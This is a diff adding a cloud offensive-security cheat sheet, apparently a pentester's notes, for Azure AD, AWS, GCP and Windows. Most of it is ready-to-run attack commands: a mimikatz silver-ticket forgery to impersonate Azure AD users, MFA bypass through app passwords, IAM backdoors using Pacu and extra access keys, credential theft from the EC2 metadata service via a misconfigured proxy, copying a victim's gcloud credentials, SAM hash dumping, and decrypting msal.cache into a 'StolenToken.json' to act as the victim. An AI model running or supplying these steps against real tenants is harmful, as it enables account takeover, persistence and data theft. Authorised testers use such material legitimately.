+     :warning: The password of the AZUREADSSOACC account never changes.
+
+     Using [https://autologon.microsoftazuread-sso.com/](https://autologon.microsoftazuread-sso.com/) to convert Kerberos tickets to SAML and JWT for Office 365 & Azure
+
+     1. NTLM password hash of the AZUREADSSOACC account, e.g. `f9969e088b2c13d93833d0ce436c76dd`. 
+         ```powershell
+         mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
+         ```
+     2. AAD logon name of the user we want to impersonate, e.g. `elrond@contoso.com`. This is typically either his userPrincipalName or mail attribute from the on-prem AD.
+     3. SID of the user we want to impersonate, e.g. `S-1-5-21-2121516926-2695913149-3163778339-1234`.
+     4. Create the Silver Ticket and inject it into Kerberos cache:
+         ```powershell
+         mimikatz.exe "kerberos::golden /user:elrond
+         /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234
+         /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd
+         /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
+         ```
+     5. Launch Mozilla Firefox
+     6. Go to about:config and set the `network.negotiate-auth.trusted-uris preference` to value `https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com`
+     7. Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.
+
+
+Stealing and faking Azure AD device identities
+     https://aadinternals.com/post/deviceidentity/
+
+
+Azure Cloud Service Packages
+     Look through cspkg zip files for creds/certs
+          Search Visual Studio Publish directory 
+               <cloud project directory>\bin\debug\publish
+
+Azure Publish Settings files (.publishsettings)
+
+Azure Storage Explorers store credentials on disk 
+
+Check %USERPROFILE%\.azure\ for auth tokens
+     TokenCache.dat file 
+
+Extract Azure PS token
+     Copy %USERPROFILE%\.Azure\AzureRmContext.json to temp dir
+
+O365 app passwords
+     bypass MFA
+     "Security & privacy” > “Additional security verification” > “Create and manage app passwords” > “Create”
+     Give the app password a name, then copy the value.
+     Use legacy protocols without MFA req to access the account
+          e.g. Outlook for Mac
+
+===AWS===
+
+
+Get basic account info
+     aws sts get-caller-identity
+
+List IAM users
+     aws iam list-users
+
+List policies for user
+     aws iam list-attached-user-policies --user-name <username>
+     aws iam list-user-policies --user-name <username>
+     Not best practice if any policies returned - "User Assigned Permissions" finding
+
+List IAM roles
+     aws iam list-roles
+
+List policies for each role
+     aws iam list-role-policies --role-name <role_name>
+          "Role with Inline Permissions" finding
+
+Password Policy
+     management console - account settings - may need to request from client if insufficient permissions
+
+List S3 buckets accessible to an account
+     aws s3api list-buckets
+     aws s3 ls
+
+List the contents of an S3 bucket
+     aws s3 ls s3://<bucketname>/
+     aws s3api list-objects --bucket <bucket_name>
+
+Download contents of bucket
+     aws s3 sync s3://bucketname s3-files-dir
+     aws s3api get-object --bucket <bucket_name> --key <file_name> 
+
+
+Get info about object
+     aws s3api head-object --bucket <bucket_name> --key <file_name>
+
+Get bucket ACL
+     aws s3api get-bucket-acl --bucket <bucket_name>
+
+Read object ACL
+     aws s3api get-object-acl --bucket <bucket_name> --key <path>
+          can be used to enumerate files/folders via error messages
+
+Get bucket logging info
+     aws s3api get-bucket-logging --bucket <bucket_name>
+          returns nothing if logging not enabled
+
+Get bucket versioning info
+     aws s3api get-bucket-versioning --bucket <bucket_name>
+          returns nothing if versioning not enabled
+
+List WebApps
+     aws deploy list-applications
+
+List AWS RDS (SQL)
+     aws rds describe-db-instances --region <region name>
+
+Knowing the VPC Security Group ID you can query the firewall rules to determine connectivity potential
+     aws ec2 describe-security-groups --group-ids <VPC Security Group ID> --region <region>
+
+List Lambda Functions
+     aws lambda list-functions --region <region>
+
+Look at environment variables set for secrets and analyze code
+     aws lambda get-function --function-name <lambda function>
+
+List EC2 instances
+     aws ec2 describe-instances
+
+List EC2 subnets
+     aws ec2 describe-subnets
+
+List ec2 network interfaces
+     aws ec2 describe-network-interfaces
+
+List security groups
+     aws ec2 describe-security-groups
+     
+List network ACLs
+     aws ec2 describe-network-acls
+
+List available ELBs
+     aws elb describe-load-balancers
+
+List VPCs
+     aws ec2 describe-vpcs
+
+List internet gateways
+     aws ec2 describe-internet-gateways
+
+List route table
+     aws ec2 describe-route-tables
+
+List Elastic IP addresses
+     aws ec2 describe-addresses
+
+List snapshots
+     aws ec2 describe-snapshots
+
+List snapshots in error status
+     aws ec2 describe-snapshot --filter "Name=status,Values=error"
+
+List unencrypted volumes
+     aws ec2 describe-volumes --query "Volumes[*].{ID:VolumeId)" --filters Name=encrypted,Values=false
+
+List acount's AMIs set to public
+     aws ec2 describe-image-attribute --image-id <AMI_id> --attribute launchPermission
+
+     Default local users
+          Amazon Linux (2) AMI - ec2-user
+          Centos AMI - centos
+          Debian AMI - admin or root
+          Fedora AMI - ec2-user or fedora
+          RHEL AMI - ec2-user or root
+          SUSE AMI - ec2-user or root
+          Ubuntu AMI - ubuntu
+
+Check for "User data" assigned to EC2 
+     may contain boot scripts with creds
+     
+     aws ec2 describe-instance-attribute --instance-id <instance_id> --attribute userData
+     
+     will be b64-encoded
+
+Get Volume status
+     aws ec2 describe-volume-status
+
+Run commands across EC2 VMs
+     AWS-RunRemoteScript (Win/Linux)
+     AWS-RunShellScript (Linux)
+     AWS-RunPowerShellScript (Win)
+
+List DirectConnect (VPN) connections
+     aws directconnect describe-connections
+
+List access keys for a user
+     aws iam list-access-keys --user-name <username>
+
+List available keys
+     aws kms list-aliases
+     aws kms list-keys
+
+Encrypt using a key
+     aws kms encrypt --key-id <alias|key_id|arn> --plaintext <string_to_encrypt> --output text --query CiphertextBlob > encrypted.base64
+
+Decrypt using a key
+     aws kms decrypt --ciphertext-blob fileb://encrypted --output text --query Plaintext
+          output will be b64'd
+
+Backdoor account with second set of access keys
+     aws iam create-access-key --user-name <username>
+
+     With admin access, can also set secondary access keys for another user
+
+
+Backdoor w/ Pacu
+     run iam__enum_users_roles_policies_groups 
+     run iam__enum_permissions
+     run iam__backdoor_assume_role
+
+     select the roles you wish to backdoor
+
+     confirm access 
+          sudo aws iam get-role --role-name <backdoored_role> --profile <profile_name>
+
+Backdoor External User
+     get the ARN of your external AWS account
+          sudo aws sts get-caller-identity
+     add user to backdoor role using Pacu
+          run iam__backdoor_assume_role --role-names <role_to_backdoor> --user-arns <external_ARN>
+     assume backdoored role if needed
+          sudo aws sts assume-role --role-arn <backdoored_role_ARN> --role-session-name <arbitrary_session_name> --profile <external_account_profile>
+
+Enumerate access for a set of keys
+     WeirdAAL
+          https://github.com/carnal0wnage/weirdAAL
+     
+          python3 weirdAAL.py -m recon_all -t <name>
+
+Assuming roles
+     Principals can assume roles, giving them temporary access to that role's permissions
+          issues temporary credentials to assuming user for the role
+     A role's "trust document" defines the conditions under which the role can be assumed
+          NOTE: principal "AWS":"arn:aws:iam::123456789012:root" means any role in the account 
+               not an actual "root account"
+     aws sts assume-role --role-arn <ARN_of_role_to assume> --role-session-name <session_name_during_assumption> --profile <auth_profile_for_user_assuming_role>
+
+
+Passing roles
+     Principals can pass roles to services, giving them temporary access to that role's permissions
+          issues temporary credentials (in metadata) for the role
+     
+     Without restrictions to the PassRole permission's resources, a user may pass to a service more permissions than they have themselves (privesc)
+
+     PassRole can be vulnerable to highly nested roles/profiles/policies obfuscating permissions being passed
+
+     See: https://ermetic.com/blog/aws/auditing-passrole-a-problematic-privilege-escalation-permission/
+
+
+Master Account 
+     should be free from AWS resources
+          except CloudTrail, to track all AWS usage in member accounts
+
+Credential Report
+     aws iam generate-credential-report
+     aws iam get-credential-report
+
+     Check if root account has active API keys 
+          "Root account with active keys" and "Root account used recently" findings
+     Check mfa_active=true or raise "User without MFA enabled" finding (raise severity if no root account MFA)
+     Check keys rotated within last 90 days 
+     Check for user with multiple API keys enabled (not just available for rotation)
+
+
+Privesc Opportunities
+     iam:CreatePolicyVersion + iam:SetDefaultPolicyVersion
+     iam:PassRole + ec2:RunInstances
+     iam:PassRole + glue:CreateDevEndpointp
+     iam:PassRole + cloudformation:CreateStack
+     iam:CreateLoginProfile + iam:UpdateLoginProfile
+     iam:AttachUserPolicy, iam:AttachGroupPolicy, or iam:AttachRolePolicy
+     iam:PutUserPolicy, iam:PutGroupPolicy, or iam:PutRolePolicy
+     iam:AdduserToGroup
+     iam:UpdateAssumeRolePolicy + sts:AssumeRole
+     iam:PassRole, lambda:CreateFunction, + lambda:InvokeFunction
+     lambda:UpdateFunctionCode
+
+     automate check using 
+          Pacu/aws_escalate.py 
+               github.com/RhinoSecurityLabs/pacu/tree/master/modules/iam__privesc_scan
+          PMapper
+               github.com/nccgroup/PMapper
+
+
+Pacu
+     AWS exploitation framework
+     https://github.com/RhinoSecurityLabs/pacu
+
+     sudo apt-get install python3-pip
+     git clone https://github.com/RhinoSecurityLabs/pacu
+     cd pacu
+     sudo bash install.sh
+
+     Import AWS keys for a specific profile
+          import_keys <profile name>
+     
+     Detect if keys are honey token keys
+          run iam__detect_honeytokens
+     
+     Enumerate account information and permissions
+          run iam__enum_users_roles_policies_groups
+          run iam__enum_permissions
+          whoami
+
+     Check for privilege escalation
+          run iam__privesc_scan
+
+
+AWS Metadata
+
+     http://169.254.169.254/latest/meta-data
+
+     User Data
+          http://169.254.169.254/latest/user-data
+
+     IAM creds possibly available here
+          http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>
+
+          Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS and misconfigured
+ 
+          curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
+
+          IMDS Version 2 has some protections but these commands can be used to access it
+ 
+               TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+               
+               curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
+
+
+===GCP===
+List accounts available to gcloud
+     gcloud auth list
+
+Get account information
+     gcloud config list
+
+List organizations
+     gcloud organizations list
+
+Enumerate IAM policies set ORG-wide
+     gcloud organizations get-iam-policy <org ID>
+
+Enumerate IAM policies set per project
+     gcloud projects get-iam-policy <project ID>
+
+List projects
+     gcloud projects list
+
+Set a different project
+     gcloud config set project <project name>
+
+List APIs enabled in project
+     gcloud services list
+
+Get source code repos available to user
+     gcloud source repos list
+
+Clone repo to home dir
+     gcloud source repos clone <repo_name>
+
+List compute instances
+     gcloud compute instances list
+
+Get shell access to instance
+     gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
+
+Puts public ssh key onto metadata service for project
+     gcloud compute ssh <local host>
+
+Use Google keyring to decrypt encrypted data
+     gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global
+
+List Google Storage buckets
+     gsutil ls
+
+List Google Storage buckets recursively
+     gsutil ls -r gs://<bucket name>
+
+Copy item from bucket
+     gsutil cp gs://bucketid/item ~/
+
+List WebApps
+     gcloud app instances list
+
+List SQL instances
+     gcloud sql instances list
+     gcloud spanner instances list
+     gcloud bigtable instances list
+
+List SQL databases
+     gcloud sql databases list --instance <instance ID>
+     gcloud spanner databases list --instance <instance name>
+
+Export SQL databases and buckets 
+     First copy buckets to local directory
+          gsutil cp gs://bucket-name/folder/ .
+     Create a new storage bucket, change perms, export SQL DB
+          gsutil mb gs://<googlestoragename>
+          gsutil acl ch -u <service account> gs://<googlestoragename>
+          gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>
+
+List networks
+     gcloud compute networks list
+
+List subnets
+     gcloud compute networks subnets list
+
+List VPN tunnels
+     gcloud compute vpn-tunnels list
+
+List Interconnects (VPN)
+     gcloud compute interconnects list
+
+Containers
+     gcloud container clusters list
+
+     GCP Kubernetes config file ~/.kube/config gets generated when you are authenticated with gcloud and run:
+          gcloud container clusters get-credentials <cluster name> --region <region>
+
+     If successful and the user has the correct permission the Kubernetes command below can be used to get cluster info:
+          kubectl cluster-info
+
+GCP functions log analysis
+     May get useful information from logs associated with GCP functions
+     
+     gcloud functions list
+     gcloud functions describe <function name>
+     gcloud functions logs read <function name> --limit <number of lines>
+
+     Gcloud stores creds in ~/.config/gcloud/credentials.db Search home directories
+          sudo find /home -name "credentials.db
+
+     Copy gcloud dir to your own home directory to auth as the compromised user
+          sudo cp -r /home/username/.config/gcloud ~/.config
+          sudo chown -R currentuser:currentuser ~/.config/gcloud
+          gcloud auth list
+
+
+Metadata Service URL
+     curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
+
+     Get access scopes if on an instance
+          curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H "Metadata-Flavor: Google"
+
+If a user authenticates to gcloud from an instance creds get stored  
+     ~/.config/gcloud/credentials.db
+
+     sudo find /home -name "credentials.db"       
+
+
+
+===OTHER===
+
+Mimikatz
+     Export Non-Exportable Private Keys From Web Server
+          mimikatz# crypto::capi
+          mimikatz# privilege::debug
+          mimikatz# crypto::cng
+          mimikatz# crypto::certificates /systemstore:local_machine /store:my /export
+
+     Dump passwords hashes from SAM/SYSTEM files
+          mimikatz# lsadump::sam /system:SYSTEM /sam:SAM
+
+Linux Bash History Location
+     ~/.bash_history
+
+Windows PowerShell PSReadLine Location
+     %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+
+     Get-PSReadLine 
+
+PowerShell transcripts
+     look for credentials
+
+     cat C:\Transcripts\<YYYYMMDD>\PowerShell_transcript.<machine_ID>.txt
+
+Web Config and App Config files
+     Web.config and app.config 
+     may contain creds or access tokens 
+     Look for management cert and extract to pfx like publishsettings files 
+
+     Often found in root folder of webapp
+
+Find internal repos
+     Portscan internal web services (80, 443, etc.) 
+     Use EyeWitness to screenshot each service
+
+     Query AD for all hostnames
+          look for subdomains 
+               git, code, repo, bitbucket, gitlab, etc.
+
+     built-in search features
+          AccessKey, AKIA, id_rsa, credentials, secret, password, token
+
+     Other saved context files (.json)
+
+     Extract msal.cache
+          Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([Security.Cryptography.ProtectedData]::Unprotect((([Text.Encoding]::Default).GetBytes((Get-Content -raw "$env:userprofile\AppData\Local\.IdentityService\msal.cache"))), $null, [Security.Cryptography.DataProtectionScope]::CurrentUser))
+          
+          Paste content into CacheData parameter (replace null with "<content>") of temp AzureRmContext.json and save as StolenToken.json
+
+          Import token (on any machine)
+               Import-AzContext -Path 'c:\path\to\StolenToken.json'
+          
+          Run Azure PS commands as victim
